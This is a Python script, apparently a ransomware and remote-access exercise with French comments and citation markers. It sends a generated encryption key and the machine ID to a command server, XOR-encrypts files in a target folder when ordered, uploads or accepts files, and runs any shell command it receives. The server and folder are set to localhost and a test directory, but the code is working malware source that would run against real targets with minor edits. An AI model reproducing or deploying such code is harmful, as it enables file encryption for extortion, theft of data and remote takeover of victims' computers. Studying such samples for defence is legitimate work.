import os, socket, subprocess, string

def get_uuid():
    try: return open("/proc/sys/kernel/random/uuid").read().strip() # 
    except: return "test-uuid"

def get_key():
    chars = string.ascii_uppercase # [cite: 42]
    return ''.join(chars[b % 26] for b in os.urandom(16)) # [cite: 41, 43]

def crypt_files(path, key):
    for root, dirs, files in os.walk(path): # [cite: 57]
        for f in files:
            if f.endswith(".py"): continue
            p = os.path.join(root, f)
            try:
                with open(p, "rb") as f_in: data = f_in.read()
                res = bytes([data[i] ^ key.encode()[i % len(key)] for i in range(len(data))]) # XOR [cite: 54]
                with open(p, "wb") as f_out: f_out.write(res)
            except: pass

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(("127.0.0.1", 8888))
        key, uid = get_key(), get_uuid()
        s.send(f"ID:{uid} | KEY:{key}".encode()) # Exfiltration initiale [cite: 61, 62]

        while True:
            cmd = s.recv(1024).decode()
            if not cmd or cmd == "exit": break

            if cmd in ["ENCRYPT", "DECRYPT"]:
                target = os.path.expanduser("~/Documents/test_attaque") # [cite: 56]
                crypt_files(target, key)
                s.send(f"Action {cmd} terminee sur {target}".encode())

            elif cmd.startswith("GET "):
                p = cmd.split()[1]
                if os.path.exists(p):
                    with open(p, "rb") as f: d = f.read()
                    s.send(str(len(d)).encode())
                    if s.recv(1024).decode() == "READY": s.sendall(d)
                else: s.send(b"ERREUR: Fichier absent")

            elif cmd.startswith("SEND "):
                size = int(s.recv(1024).decode())
                s.send(b"READY")
                data = b""
                while len(data) < size: data += s.recv(4096)
                name = "recu_" + os.path.basename(cmd.split()[1])
                with open(name, "wb") as f: f.write(data)
                s.send(f"Fichier {name} bien recu par la victime".encode())
            else:
                try:
                    out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT) # [cite: 81]
                    s.send(out if out else b"OK")
                except Exception as e: s.send(str(e).encode())
    finally: s.close()

if __name__ == "__main__":
    main()
